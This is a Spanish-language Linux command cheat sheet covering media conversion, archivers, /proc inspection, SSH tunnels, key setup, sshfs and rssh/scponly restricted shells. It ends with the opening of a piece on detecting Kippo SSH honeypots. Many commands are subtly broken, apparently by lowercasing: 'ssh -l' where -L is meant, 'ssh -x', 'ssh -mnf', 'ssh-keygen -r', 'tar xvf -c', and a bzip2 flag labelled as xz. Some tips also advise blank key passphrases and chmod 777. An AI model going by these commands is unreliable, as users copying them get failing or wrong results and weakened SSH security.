ffmpeg2theora -q 6 -a 192 input_file.avi

#### esto convertira input_file.avi a theora video utilizando un factor de calidad de video de 6 y un bitrate de audio de 192 kbps. aqui hay otro ejemplo, que utiliza la configuracion predet$

ffmpeg2theora input_file.vob -o output_file.ogg

#### o este otro, que tambien anade meta-tags al video: ####

ffmpeg2theora --artist "pink floyd" --title "live at pompeii" input_file.vob -o output_file.ogg



#############################################################################################################################################################################################

############################################################################################ avconv #########################################################################################

#### avconv

#### grabar video escritorio ####

avconv -f x11grab -r 60 -s 1920x1080 -i :0.0 -vcodec libvpx -b:v 1m output.webm

avconv -f alsa -i pulse -f x11grab -r 15 -s 1920x1080 -i :0.0 -vcodec wmv1 -acodec pcm_s16le -q 7 b4.avi


#############################################################################################################################################################################################

########################################################################################### mencoder ########################################################################################

#### mencoder

#### pegar subtitulos mencoder ####

mencoder archivo_original -sub archivo_subtitulo -oac copy -ovc xvid -xvidencopts pass=1 -o videonuevo -subcp utf-8 -font ruta_a_la_fuente -subfont-text-scale 3.8

#### convertir archivos de video para usarlos con cinelerra ####

mencoder -of avi -o salida.avi -ovc lavc -lavcopts vcodec=mjpeg -oac mp3lame entrada.avi

mencoder -of avi -o salida.avi -ovc lavc -oac lavc -lavcopts vcodec=mpeg4:acodec=mp3 entrada.avi

#### convertir cualquier formato de video a .avi para reproducirlo en un dvd usando mencoder ####

mencoder "archivo de entrada" -of avi -ovc xvid -oac mp3lame -xvidencopts "fixed_quant=4:aspect=4/3:threads=4" -lameopts vbr=2:br=128 -vf scale=720:576 -ofps 25 -o "archivo de salida"

#### extraer pistas de audio de desde un video con mencoder ####

mencoder entrada.avi -of rawaudio -oac mp3lame -ovc copy -o salida.mp3

#### convertir .ogv a .avi ####

mencoder -idx mivideo.ogv -ovc lavc -oac mp3lame -o nombrefinaldevideo.flv

#### unir varios archivos de video en uno usando mencoder ####

mencoder -oac copy -ovc copy -idx parte_1.wmv parte_2.wmv parte_3.wmv -o video_entero.wmv

#### dividir videos con mencoder ####

mencoder -ovc copy -oac copy -ss 0 -endpos 4mb -o parte_1.wmv video_original.wmv   - (si no se espesifica el parametro "-ss" se comienza desde el principio de la pelicula) (el parametro "endpos" indica la duracion de la partea dividir)

mencoder -ovc copy -oac copy -ss 1:10 -endpos 8:00 -o parte_1.avi video_original.avi   - (si no se espesifica el parametro "-ss" se comienza desde el principio de la pelicula) (el parametro "endpos" indica la duracion de la parte a dividir)

#### convertir .ogv a .avi ####

mencoder -idx mivideo.ogv -ovc lavc -oac mp3lame -o nombrefinaldevideo.flv

#### convertir mkv a avi con mencoder. esta es una manera de convertir los archivos matroska video a avi con mencoder: ####

mencoder input_file.mkv -ffourcc xvid -ovc lavc -lavcopts vcodec=xvid:vhq:vbitrate=1800 -oac mp3lame -lameopts vbr=5 -o output_file.avi

#### convertir .rmvb a .avi ####

instalar libstdc++5, mencoder y w32codecs   

mencoder -oac mp3lame -lameopts cbr=128 -ovc xvid -xvidencopts bitrate=1200 video_entrada.rmvb -o video_salida.avi

#### crear un archivo de video desde imagenes jpg ####

mencoder "mf://*.jpg" -mf fps=10 -o test.avi -ovc lavc -lavcopts vcodec=msmpeg4v2:vbitrate=800


#############################################################################################################################################################################################

############################################################################################# sox ###########################################################################################

#### soxmix #### play

#### unir varios archivos de audio ####

soxmix tema1.ogg tema2.ogg mezcla.ogg (tambien mp3,wav,au,etc)



#############################################################################################################################################################################################

######################################################################################## normalize-audio ####################################################################################

#### normalize-audio

#### ajustar el volumen de uno o varios archivos de audio ####

normalize-audio *.wav

normalize-mp3 *.mp3

normalize-ogg *.ogg



#############################################################################################################################################################################################

######################################################################################### arecord aplay #####################################################################################

#### arecord #### aplay

#### grabar desde el microfono ####

dijo: arecord -f dat -t wav prueba.wav

#### comprobar la grabacion con arecord ####

dijo: aplay -t wav -f dat prueba.wav

#############################################################################################################################################################################################

########################################################################################### tar #############################################################################################

#### tar

#### empaquetar un .tar ####

tar -vcf archivo.tar archivo1 archivo2     (archivo puede ser directorio) ("c" quiere decir comprimir compress)

#### desempaquetar un .tar ####

tar -vxf archivo.tar    ("x" quiere decir extraer extract)

#### ver contenido de un paquete .tar ####

tar -vtf archivo.tar

#### nota:  para comprimir varios archivos y empaquetarlos en un solo archivo hay que combinar el tar y el gzip o el bzip2 de la siguiente manera: ####

tar -zvcf archivo.tgz directorio    ("z" quiere decir que combinamos tar con "gzip" "v" qiere decir "verbose" "c" compress "f" file o nombre de archivo)

#### desempaquetar y descomprimir un tgz ####

tar -zvxf archivo.tgz    ("z" gzip "v" verbose "x" extract "f" file)

#### ver contenido de un tgz ####

tar -zvtf archivo.tgz

#### empaquetar y comprimir un .tbz2 ####

tar -jvcf archivo.tbz2 directorio

#### desempaquetar y descomprimir un .tbz2 ####

tar -jvxf archivo.tbz2

#### ver contenido de un .tbz2 ####

tar -jvtf archivo.tbz2

#### crear un tar con compresion xz ####

tar -cjf myarchive.tar.xz /path/to/archive/

#### crear un tar con compresion 7zip ####

tar cf - /path/to/data | 7z a -si archivename.tar.7z

#### descomprime indicando la ruta ####

tar xvf -c carpeta/destino/ download/archivo.tar.gz   - con el parametro "-c" de tar le podemos indicar la ruta de descompresion

#### comprimir archivos o carpetas y mostrar una barra de progreso ####

tar -cf archivo_salida.tar archivo_entrada | pv -s $(du -sb . | awk '{print $1}') | gzip > out.tgz

#### parametros descomprimir un tar.gz (x - extract) de los archivos, cuyos nombres deben ser visualizados en la pantalla (v - verbose), y nombre del archivo a descomprimir f (file) ####

tar -xzvf archivo.tar.gz   o   tar xzvf archivo.tar.gz   -   el guion no es obligatorio en esta instruccion

#### para descomprimir bzip2 basta con cambiar gzip por bzip2 y gunzip por bunzip2, y el argumento "z" de la instruccion tar por el argumento "j" ####

tar xjvf archivo.tar.bz2   o   tar -xjvf archivo.tar.bz2   -   el guion no es obligatorio en esta instruccion



nota: "r" equivale en todos los casos a recursivo, mientras que zip comprime y empaqueta, gzip o bzip2 solo comprimen archivos, no directorios,para eso existe tar.

#############################################################################################################################################################################################

############################################################################################ gzip ###########################################################################################

#### gzip

#### para crear un archivo comprimido .gz utilizamos gzip ####

gzip archivo

#### para descomprimir el archivo .gz utilizamos gzip ####

gzip -d archivo.gz

#### para comprobar el peso de un archivo sin compresion y luego comprimido con gzip ####

gzip -l arvhivo.gz

#### comprimir un directorio en .gz ####

gzip -r archivo     ejemplo: gzip -r ./sinatra

#### ver contenido gz. ####

gzip -c archivo.gz

#### comprime con compresion maxima ####

gzip -9 archivo



#### para ver el contenido de un archivo con compresion .gz ####

zcat archivo.gz

zmore archivo.gz

zless archivo.gz


nota: "r" equivale en todos los casos a recursivo, mientras que zip comprime y empaqueta, gzip o bzip2 solo comprimen archivos, no directorios,para eso existe tar.

#############################################################################################################################################################################################

############################################################################################# bzip2 #########################################################################################

#### bzip2

#### para comprimir un archivo .bz2 bzip ####

bzip2 archivo

#### para descomprimir un archivo .bz2 bzip ####

bzip2 -d archivo.bz2




nota: "r" equivale en todos los casos a recursivo, mientras que zip comprime y empaqueta, gzip o bzip2 solo comprimen archivos, no directorios,para eso existe tar.

#############################################################################################################################################################################################

############################################################################################ unzip ##########################################################################################

#### unzip

#### para des comprimir un archivo .zip unzip ####

unzip archivo.zip

#### para listar ver el contenido de un archivo .zip sin descomprimirlo unzip ####

unzip -l archivo.zip




nota: "r" equivale en todos los casos a recursivo, mientras que zip comprime y empaqueta, gzip o bzip2 solo comprimen archivos, no directorios,para eso existe tar.

#############################################################################################################################################################################################

############################################################################################## rar ##########################################################################################

#### rar

#### para extraer los contenidos de un .rar: - to extract the contents of a .rar file, run this command: ####

rar e archivo.rar

#### para extraer un .rar manteniendo su extructura de directorios - to extract an archive file and keep full path intact, run this command: ####

rar x folder.rar

####  para comprimir archivos a .rar - to compress a file into a rar file, run this command: ####

rar a archivo.rar archivos_a_comprimir.ext

#### para comprimir una carpeta - to compress a folder, run this command: ####

rar a -r carpeta.rar directorio/a/comprimir/

#### para comprimir un archivo y dividirlo en partes de 20 mb - to compress and split the file into 20 mb fragments ####

rar a -v20000 archivo.rar archivo.mp4

rar a -v20000 -vn archivo.rar archivo.mp4




nota: "r" equivale en todos los casos a recursivo, mientras que zip comprime y empaqueta, gzip o bzip2 solo comprimen archivos, no directorios,para eso existe tar.

#############################################################################################################################################################################################

############################################################################################## 7z ###########################################################################################

#### 7z

#### comprimir ####

7z a archivo.7z archivo

#### descomprimir. ####

7z e archivo_comprimido

#### extraer donde indicamos. ####

7z x archivo_comprimido -o ruta_de_destino

#### ver contenido. ####

7z l archivo_comprimido

#### chequea el contenido. ####

7z t archivo_comprimido

#### notas sobre 7zip: comprime en formato 7z, zip, gzip, bzip2 y tar. si es un directorio lo hace recursivamente sin emplear la opcion -r ####

#### con -t{tipo de archivo} tras las opcion \"a\" elegimos el formato de compresion: ####

7z a -tgzip archivo.gz archivo

#### con -p protegemos con una contrasena el archivo: ####

7z a -tgzip -p archivo.gz archivo

#### nota 2: el formato 7z no guarda el dueno o grupo de un archivo por lo que | | no es recomendable para copias de seguridad. ####

#### nota 3:  es capaz de descomprimir zip, rar, gz, bz2, tar, cab, arj, cpio, deb, rpm aunque para rar necesita del paquete 7zip-rar ####




nota 4: "r" equivale en todos los casos a recursivo, mientras que zip comprime y empaqueta, gzip o bzip2 solo comprimen archivos, no directorios,para eso existe tar.

#############################################################################################################################################################################################

############################################################################################# zip ###########################################################################################

#### zip

#### comprimir un .zip ####

zip -r archivo.zip archivo    ejemplo:  zip -r sinatra.zip ./sinatra/



nota: "r" equivale en todos los casos a recursivo, mientras que zip comprime y empaqueta, gzip o bzip2 solo comprimen archivos, no directorios,para eso existe tar.

#############################################################################################################################################################################################

############################################################################################ unzip ##########################################################################################

#### unzip

#### descomprimir zip. ####

unzip archivo.zip

#### ver contenido zip. ####

unzip -v archivo.zip



nota: "r" equivale en todos los casos a recursivo, mientras que zip comprime y empaqueta, gzip o bzip2 solo comprimen archivos, no directorios,para eso existe tar.

#############################################################################################################################################################################################

############################################################################################ unrar ##########################################################################################

#### unrar

#### descomprimir rar. en el directorio actual ####

unrar e -r archivo.rar (e extrae en el directorio actual)

#### descomprimir rar. en un directorio que le indiquemos ####

unrar x -r archivo.rar directorio_de_destino/ (x extrae donde se indique)

#### ver contenido rar. ####

unrar v archivo.rar



nota: "r" equivale en todos los casos a recursivo, mientras que zip comprime y empaqueta, gzip o bzip2 solo comprimen archivos, no directorios,para eso existe tar.

#############################################################################################################################################################################################

############################################################################################# lha ###########################################################################################

#### lha

#### comprimir ####

lha -a archivo.lha archivos

#### descomprimir ####

lha -x archivo.lha

#### ver contenido ####

lha -v archivo.lha

#### ver contenido: ####

lha -l archivo.lha



#############################################################################################################################################################################################

############################################################################################## arj ##########################################################################################

#### arj

#### comprimir ####

arj a archivo.arj archivos

#### descomprimir ####

unarj archivo.arj

#### descomprimir ####

arj -x archivo.arj

#### ver contenido ####

arj -v archivo.arj

#### ver contenido ####

arj -l archivo.arj



#############################################################################################################################################################################################

############################################################################################# zoo ###########################################################################################

#### zoo

#### comprimir ####

zoo a archivo.zoo archivos

#### descomprimir ####

zoo -x archivo.zoo

#### ver contenido ####

zoo -l archivo.zoo

#### ver contenido ####

zoo -v archivo.zoo



#############################################################################################################################################################################################

########################################################################################### mplayer #########################################################################################

#### mplayer

#### reproducir un video cargando un archivo de audio externo ####

mplayer -fs video.mp4 -audiofile audio.mp3

#### reproducir un dvd con menues interactivos ####

mplayer -fs -slang en dvd:// dvd.iso

#### iniciar cam con mplayer ####

mplayer tv:// -tv driver=v4l2:width=640:height=480:device=/dev/video0 -fps 15 -vf screenshot

#### extraer audio desde archivos de video ####

mplayer -vo null -dumpaudio -dumpfile audio.mp3 video.avi

mplayer -ao pcm:fast:file=audio.mp3 -vo null -vc null video.avi

#### extraer audio de archivos vob de dvd ####

#### para ello vamos a utilizar mplayer asi: ####

mplayer input_file.vob -aid 128 -dumpaudio -dumpfile output_file.ac3

#### reproducir archivos .rar sin descomprimirlos ####

unrar p -inul archivo.rar | mplayer -vo xv -cache 100000 -

#### pasar de asf/wma a wav ####

mplayer -ao pcm archivo.asf

#### escuchar radio ####

mplayer -cache 100 mms://...                                              (protocolo mms)  http://www.shoutcast.com/  http://www.icecast.org

mplayer -cache 100 -playlist http://ruta_del_archivo.asx                  (protocolo mms)  http://www.shoutcast.com/  http://www.icecast.org

mlayer http://... ;ejemplo:mplayer http://147.156.27.128:8004             (shoutcast-icecast)  http://www.shoutcast.com/  http://www.icecast.org

somaplayer http://... ;ejemplo:somaplayer http://147.156.27.128:8004      (shoutcast-icecast)  http://www.shoutcast.com/  http://www.icecast.org



#### nota ####

# solucion screensaver mplayer #

echo "heartbeat-cmd = \"gnome-screensaver-command --deactivate > /dev/null\"" >> $HOME.mplayer/config

#############################################################################################################################################################################################

############################################################################################ split ##########################################################################################

#### split

#### split nos sirve para dividir un archivo en partes de menor peso que luego podemos unir con cat ####

#### un ejemplo de su uso basico puede ser ####

split -b 1445640 mozart.ogg mozart ----> nombre elegido para las partes, por defecto x
            |
            v
  tamano en bytes de cada parte

#### para luego unir las partes divididas podriamos hacer ####

cat mozart.* > mozart.ogg



#############################################################################################################################################################################################

############################################################################################# cat ###########################################################################################

#### cat

#### un util parametro que le podemos pasar a cat es -n, que agregara numeros a cada linea que contenga un archivo ####

cat -n archivo

#### listar el contenido de un archivo mostrando el numero de lineas para luego poder editar esa linea facilmente con nano +linea ####

cat -n archivo.txt | grep cadena   - util para luego abrir el archivo con nano +numero de linea, y asi editar un archivo facilmente

#### verificar disk scheduler bfq cfq ####

cat /sys/block/sda/queue/scheduler

#### cambiar programador de lectura de disco i/o change io scheduler ####

grub_cmdline_linux_default="quiet splash elevator=cfq"

#### puedes eventualmente, concatenar los archivos vob en primer lugar, por ejemplo: ####

cat vts_01_1.vob vts_01_2.vob vts_01_3.vob > ~/output_file.vob    -  y luego proceder y utilizar el mplayer en el recien creado output_file.vob.

#### ver el contenido de la ram de una forma facil de entender ####

cat /proc/kcore | strings | awk 'length > 20' | less

#### revisar log time stamp calibration tsc ####

cat /var/log/dmesg | grep tsc

#### procesadores disponibles ####

cat /sys/devices/system/clocksource/clocksource0/available_clocksource

#### procesador en uso ####

cat /sys/devices/system/clocksource/clocksource0/current_clocksource

#### dpm commands comandos parametros dynamic power managements ####

#### forzar rendimiento de la tarjeta a diferentes estados: auto low high ####

cat /sys/class/drm/card0/device/power_dpm_force_performance_level

#### verificar cual es el estado de la tarjeta grafica ####

cat /sys/kernel/debug/dri/64/radeon_pm_info

#### especificar un estado temporalmente:  battery balanced performance ####

cat /sys/class/drm/card0/device/power_dpm_state

#### archivo que contiene informacion sobre nuestro gestor de secion predeterminado lightdm gdm o kdm ####

cat /etc/x11/default-display-manager

#### crear una imagen .iso desde un cd o dvd que tengamos en nuestra lectora de cd dvds ####

cat /dev/cdrom > imagen.iso

#### version del nucleo y compilador empleado para su compilacion ####

cat /proc/version

#### lista los modulos cargados en el kernel ####

cat /proc/modules

#### informacion sobre la memoria ####

cat /proc/meminfo

#### informacion sobre el procesador ####

cat /proc/cpuinfo

#### informacion sobre dispositivos en uso ####

cat /proc/devices

#### mostrar las interrupciones ####

cat /proc/interrupts

#### mostrar informacion sobre cuanto se esta utilizando de swap ####

cat /proc/swaps

#### mostrar adaptadores de red y estadisticas ####

cat /proc/net/dev

#### mostrar los sistemas de archivos montados ####

cat /proc/mounts

#### obtener una salida parecida a lsb_release ####

cat /etc/*-release

#### Filtrar chat entre dos jugadores urban terror

cat urban/public/q3ut4/games.log | egrep -i 'lau|Pacoeldeeltaller' | grep say

#### Find out the connected state of a network cable in Linux ####

cat /sys/class/net/enp5s0/carrier

cat /sys/class/net/enp5s0/operstate

#############################################################################################################################################################################################

############################################################################################# tac ###########################################################################################

#### tac

#### tac hace lo mismo que cat, aunque muestra el contenido de archivos en orden inverso ####



#############################################################################################################################################################################################

############################################################################################## pr ###########################################################################################
 
#### pr

#### pr sirve para darle formato a archivo de texto para luego ser imprimidos ####



#############################################################################################################################################################################################

########################################################################################### rtmpdump ########################################################################################

#### rtmpdump

#### reproducir el canal tn, tvrepublica mediante rtmp ####

rtmpdump -r rtmp://stream.tn.com.ar/live -a live -y tnhd1 -w http://tn.com.ar/sites/all/themes/dozer/swf/cplayer/player.swf -p http://tn.com.ar/envivo/24hs -f "lnx 10,3,162,29" | mplayer -fs -
rtmpdump -r rtmp://canal7vivoflash.telecomdatacenter.com.ar/live/ -a live -y livestream -w "http://www.tvpublica.com.ar/recursos/media/swf/player.swf?0.5006350128952468" -p http://www.tvpublica.com.ar/tvpublica/ -f "lnx 10,3,162,29" -v | mplayer -fs -

#### capturar streaming justin tv ####

apt-get install rtmpdump

mkdir justin

chmod 777 justin

cd justin

iptables -t nat -A OUTPUT -p TCP --dport 1935 -m owner  \! --uid-owner <usuario> -j REDIRECT

rtmpsuck

#### ir a justintv.com y hacer click sobre un video cualquiera ####




#############################################################################################################################################################################################

########################################################################################## handbrakecli #####################################################################################

#### handbrakecli

#### convertir .mts a .mp4 con handbrake ####

handbrakecli -i input.mts -o output.mp4 -f mp4 -e x264 -q 0.6 -e faac -b 128 -6 stereo -w 1280 -l 720 --denoise=strong

#### convertir .wmv a .mp4 con handbrak ####

handbrakecli -i input.wmv -o output.mp4 -f mp4 -e ffmpeg -e lame -b 128 -6 stereo -w 640 -l 480


#### cortar videos ####

#### Starts 10 seconds into the video and transcodes all the rest of the vide ####

HandBrakeCLI -i foo -o "stuff1.m4v" --start-at duration:10 --preset="High Profile"

#### Starts at the beginning and transcodes the first 10 seconds of the video only ####

HandBrakeCLI -i foo -o "stuff2.m4v" --stop-at duration:10 --preset="High Profile"

#### Starts 10 seconds into the video and transcodes the next 10 seconds of the video only ####

HandBrakeCLI -i foo -o "stuff3.m4v" --start-at duration:10 --stop-at duration:10 --preset="High Profile"


#############################################################################################################################################################################################

############################################################################################# ssh ###########################################################################################

#### ssh

#### ssh sin contrasena

#### Para conseguir conectarnos via ssh sin que se nos pida la contrasena, podemos crear una clave publica y otra privada con ssh-keygen. Una vez creadas, no tendremos mas que anadir la clave publica al fichero authorized_keys del usuario con el que nos conectamos a la maquina remota. ####


#### Primero, generamos en nuestra maquina un par de claves (privada y publica) mediante ssh-keygen: ####

# ssh-keygen -t rsa   - ssh-keygen nos pedira una frase de paso. La dejaremos en blanco para que no nos la pida al conectarnos al equipo remoto. En el directorio .ssh de nuestro home se creara la clave privada (id_rsa) y la publica (id_rsa.pub). Por ejemplo, si mi usuario es adrian, la clave privada se encontrara almacenada en /home/adrian/.ssh/id_rsa y la clave publica en /home/adrian/.ssh/id_rsa.pub


#### Despues nos conectamos a la maquina remota: ####

# ssh usuario@servidor


#### Y anadimos el contenido del fichero id_rsa.pub al fichero authorized_keys del usuario con el que accedemos en la maquina remota: ####

# cat ~/id_rsa.pub >> ~/.ssh/authorized_keys


#### Por cierto. Este proceso de copia de nuestra clave publica, podemos hacerlo de un plumazo mediante el comando ssh-copy-id: ####

# ssh-copy-id -i /home/adrian/.ssh/id_rsa.pub usuario@servidor


Y ya esta. A partir de ahora, cada vez que nos conectemos a la maquina remota, tendremos acceso sin tener que teclear la password


#### Arch way:

# Generatin pub and private keys on the local machine

ssh-keygen -C "$(whoami)@$(hostname)-$(date -I)"

# Copy our pub key to the remote host

ssh-copy-id -p <port> username@remote-server.org

# Access Now, try to access the server:

curiousx@arch:~$ ssh chuck@host.com
Enter passphrase for key '/home/curiousx/.ssh/id_rsa':
chuck@host.com:~$

# On this case, the client’s key was encrypted and its password was asked. If it had no password, nothing would have been asked, and access would be direct:

curiousx@arch:~$ ssh chuck@host.com
chuck@host.com:~$

# Adding your SSH key to the ssh-agent so you wont need to type in the passphrase as long as you don't logout or reboot

# Start the ssh-agent in the background

eval "$(ssh-agent -s)"

# Add your SSH key to the ssh-agent. If you are using an existing SSH key rather than generating a new SSH key, you'll need to replace id_rsa in the command with the name of your existing private key file.

ssh-add ~/.ssh/id_rsa


#### ssh enjaular usuarios jailkit

#### Instalacion #### 

#### primero descargar jailkit ####

wget http://olivier.sessink.nl/jailkit/jailkit-2.14.tar.gz   - verificar si existe una version mas reciente 

#### Despues de descargar, instalar ####

tar -zxvf jailkit-2.14.tar.gz

cd jailkit-2.14

./configure

make

sudo make install

#### Crear el directorio que contendra el sistema enjaulado ####

sudo mkdir /home/jail

sudo chown root:root /home/jail

#### Crear el entorno ####

sudo jk_init -v /home/jail basicshell
sudo jk_init -v /home/jail editors
sudo jk_init -v /home/jail extendedshell
sudo jk_init -v /home/jail netutils
sudo jk_init -v /home/jail ssh
sudo jk_init -v /home/jail sftp
sudo jk_init -v /home/jail sftp
sudo jk_init -v /home/jail jk_lsh

#### Crear el usuario y enjaularlo ####

sudo adduser jail_user
sudo jk_jailuser -m -j /home/jail jail_user

#### Comprobar que el fichero /etc/passwd tiene la siguiente linea ####

jail_user:x:1001:500::/home/jail/./home/jail_user:/usr/sbin/jk_chrootsh

#### Asignar una contrasena al usuario ####

sudo passwd jail_user

fuente: www.admhost.com 




#### verificar que usuarios maquinas remotas se han conectado a nuestro servidor ssh seguridad ####

cat /var/log/auth* | grep accepted

#### permisos para la carpeta ssh ####

700 for ~/.ssh/ and 600 for ~/.ssh/authorized_keys

#### servidor ssh ####

#### 1- generar las claves publicas y privadas para servidores y clientes ssh ####

sshd-generate

#### 2- iniciar servidor ssh ####

/etc/init.d/ssh start

#### comprobar claves ssh publica y privada nota: tambien podemos utilizar colordiff ####

diff <(ssh-keygen -y -f ~/.ssh/id_rsa) <(cut -d' ' -f1,2 ~/.ssh/id_rsa.pub)

#### tunel ssh para usar con squid proxy ####

ssh -l 5912:localhost:3128 <ip servior ssh> -l <usuario en el servidor remoto>   - ssh -l puertoaca:localhost:puertoalla usuario@ipalla

#### ejecutar un comando en un server ssh remoto ####

ssh user@server comando

#### ejecutar en un server remoto usando ssh ####

ssh -t user@server 'ls /etc'

#### conectarme servidor sdf ssh remoto ####

ssh chucknorris@tty.sdf.org

#### ssh corriendo aplicaciones que requieren x ####

ssh -x -l user 192.168.1.25

#### ssh vpn de los pobres ####

sshuttle --d --pidfile=/tmp/sshuttle.pid -r user@server:1234 --dns 0/0

#### vpn sin vpn conectarte a un server ####                                                                                  

sshuttle -r <username>@<sshserver> 0/0

#### vpn ssh ####

sshuttle --dns -vvr user@server 0/0

#### ssh atravez proxy sock ####

ssh -o proxycommand='nc -x proxyhost:8080 %h %p' targethost

#### generar clave llave publica ssh purblic key en rsa ####

ssh-keygen -t rsa

#### copiar la clave llave publica ssh sin ssh-copy-id util cuando necesitamos copiar nuestra llave desde un equipo que no tiene ssh-copy-id y no tenemos permisos para instalarlo ####

cat ~/.ssh/id_rsa.pub | ssh user@machine "mkdir ~/.ssh ; cat >> ~/.ssh/authorized_keys"

#### para conectarte a un servidor ssh sin tener que tipear una y otra vez creamos y copiamos nuesta llave key al servidor ssh con ####

ssh-copy-id usuario@host   - en el caso de estar escuchando en otro puerto se lo especificamos con el parametro -p asi:  ssh-copy-id usuario@host -p 4444

#### crear un tunel al puerto 80 de nuestro servidor ssh hacia el puerto 2001 de nuestra maquina local para poder aceder a nuestra pagina web desde nuestro navegador indicando http://localho$

ssh -N -L2001:localhost:80 servidor   - ahora se puede acceder al sitio web, en su navegador:  http://localhost:2001

#### instalar sshfs para poder montar directorios remotos alojados en nuestro servidor ssh en nuestro equipo local ####

apt-get install sshfs

#### montar directorio/sistemas de archivos a traves de ssh con el comando ####

sshfs usuario@host:/directorio/remoto /punto/de/montaje/local   - ejemplo:  sshfs root@192.168.0.113:/home/root/datos-server /tmp/montado

#### comparar un archivo remoto en nuestro servidor ssh con un archivo local:

ssh user@host cat /path/to/remotefile | diff /path/to/localfile -   - ejemplo:  ssh root@192.168.0.113 cat ~/datos-server/autos  | diff ~/backup/autos -

#### establecer una conexion ssh a un servidor a traves de un pc en nuestra lan y que este en el medio de la maquina desde donde tiramos el comandos ssh y nuestro server remoto ####

ssh -t servidor-local ssh servidor-remoto    - ejemplo:  ssh -t root@servidor-local ssh pepe@servidor-remoto

#### crear una conexion persistente en segundo plano a un servidor ssh remoto ####

ssh -mnf usuario@host

#### medir el rendimiento de la red al conectarnos a un server ssh ####

yes | pv | ssh host "cat > /dev/null"

#### crear un archivo tar de un directorio remoto en nuestro server ssh, para luego transferirlo al equipo local ####

ssh user@host "tar -zcpf - /path/to/dir" > dir.tar.gz

#### eliminar un host del archivo .ssh/know_host, util para la actualizacion de claves de servidor ssh conocidos cuando cambian ####

ssh-keygen -r host   - ssh-keygen -r 190.177.111.222

#### ejecutar cualquier aplicacion grafica remota ssh ####

ssh -x usuario@host gedit

#### sincronizar archivos con un servidor ssh remoto utilizando rsync ####

rsync -av -e ssh user@host:/dir/remoto/ /dir/local/

#### copiar un archivo de nuestra maquina local hacia nuestro servidor ssh remoto sin usar scp ####

ssh usuario@host cat < archivo-local ">" archivo-remoto

#### copiar un archivo desde el servidor ssh remoto hacia nuestro equipo local sin usar scp ####

ssh usuario@host cat > archivo-local "<" archivo-remoto

#### ejecutar script local en el servidor ssh remoto ####

ssh -t user@server < script.sh   - "-t" desactiva ls asignacion pseudo-tty"

#### cambiar la contrasena para ingresar al servidor ssh rsa ####

ssh-keygen -f ~/.ssh/id_rsa -p

#### saltar banner en pantalla de login ssh, esto le permite saltarse el mensaje de bienvenida en las conexiones ssh (normalmente /etc/issue.net) ####

ssh -q user@server

#### instalar servidor ssh ####

apt-get install openssh-server

#### cambiar la contrasena para ingresar al servidor ssh rsa ####

ssh-keygen -f ~/.ssh/id_rsa -p

#### saltar banner en pantalla de login ssh, esto le permite saltarse el mensaje de bienvenida en las conexiones ssh (normalmente /etc/issue.net) ####

ssh -q user@server

#### instalar servidor ssh ####

apt-get install openssh-server

#### debug ssh client connection ####

ssh -v -l user remotehost.example.com

#### display ssh client version ####

ssh -v

#### rsync over ssh ####

rsync -arvz -e 'ssh -p 2233' --progress --delete remote-user@remote-server.org:/path/to/folder /path/to/local/folder

#### ssh autocomplete ####

complete -w "$(echo $(grep ^host ~/.ssh/config | sed -e 's/host //' | grep -v "\*"))" ssh

#### reproducir y descargar un archivo desde una maquina remota mediante un canal seguro usando ssh ####

ssh user@host cat remote_file.mp4 | tee local_file.mp4 | mplayer -



#### rssh #### scponly


Linux Restricted Shells: rssh and scponly

Restricted shells like rssh and scponly give sysadmin the possibility to limit the operations that Linux user can do, for example you can create user that will be allowed to copy files via scp but won’t be permitted to login into system’s command line. This is quite important security feature that should be considered by every sysadmin to prevent unauthorized activity by users for example over SSH.

If you have some online storage that is used for uploading backup data over scp or rsync/ssh from remote hosts then it is highly recommended to use restricted shells for those incoming connections and make sure that even if the attacker has got username/password (or key) then he (or she!) won’t be able to break into your system.

scponly is extremely simple restricted shell, user account that has scponly binary as its shell won’t be able to do anything except transfer data from remote host via scp protocol or via rsync/scp. rssh provides little bit more features: you can limit users to use selected protocols like scp, sftp, rsync, cvs or rdist either in chroot environment or not.


# Installation #

I prefer using yum or aptitude to install such kind of software like rssh or scponly so the fastest way is to try one of below commands depending on your needs:

apt-get install rssh
apt-get install scponly
yum install rssh
yum install scponly

If there are problems to find desired restricted shell in your Linux distro’s repository then you should download sources and do some ./configure, make and make install. Here are the links: latest rssh .tar.gz, latest scponly .tgz.


# Configuration #

scponly doesn’t need any configuration and works out of the box so you just should set it as a shell for user account. Here are some examples.


# Create new user account with scponly as shell: #

useradd -s /usr/sbin/scponly user1


# Modify user account to set rssh as a shell: #

usermod -s /usr/sbin/rssh user2

Where /usr/sbin/scponly is binary executable of scponly.

rssh comes with text configuration file usually stored in /etc/rssh.conf. You can either setup per-user settings there or configure global restrictions for all accounts which are using rssh. Default rssh.conf file is well commented so there shouldn’t be any problems to configure rssh as you needs. At the same time, here are some examples.


# If you wish to restrict all users to scp and rsync only then you should uncomment lines in rssh.conf like below: #

allowscp
#allowsftp
#allowcvs
#allowrdist
allowrsync


# Now coming to per-user examples. User peter is allowed to use scp protocol only, the following line in rssh.conf will do that: #

user=sbk:022:00001:


# User ann is allowed to scp, rsync only: #

user=sbk:022:10001:


# As you can see enabled protocols in per-user setup are specified as 11000 (scp, sftp), 11111 (scp, sftp, cvs, rdist, rsync) or 00000 (no protocols enabled). 022 in above examples specifies umask. #


# Testing #

# Let’s assume you’ve created user1 and enabled only scp and rsync using rssh. An attempt to access the server via SSH under user1 account will end with the following output: #

artiomix$ ssh user1@1.2.3.4
user1@1.2.3.4's password: 
 

# This account is restricted by rssh. #

Allowed commands: scp rsync
 
If you believe this is in error, please contact your system administrator.
 
Connection to 1.2.3.4 closed.


# At the same time scp transfers will work without problems: #

artiomix$ scp -P 23451 /etc/test.file user1@1.2.3.4:/tmp
user1@1.2.3.4's password:
test.file                             100%  983     1.0KB/s   00:00


# Further Reading #

rssh support chroot environments for scp, rsync and other transfer protocols. It means that you can restrict users not only by command they can use but also by filesystems they reach. For example, user1 can be chrooted to /chroot_user1 so it can’t be used to copy something from /etc or /var/www directories of the server. Here is nice manual about chroot in rssh.

# Only allow specific users

AllowUsers username

# Fix for bug: Bad port 'umask 077; test -d ~/.ssh || mkdir ~/.ssh ; cat >> ~/.ssh/authorized_keys'

ssh-copy-id -i /home/user/.ssh/id_rsa.pub '-p 57777 user@192.168.1.111' <--- use single quote to fix the bug

########################################################################################## kippo ssh ########################################################################################

#### kippo

# Detecting Kippo SSH honeypots, bypassing patches, and all that jazz #

# Background #

I have a lot of honeypots configured around the Internet. I use these honeypots to gather intelligence on what bad guys are up to. One honeypot used by myself and many others is "Kippo".

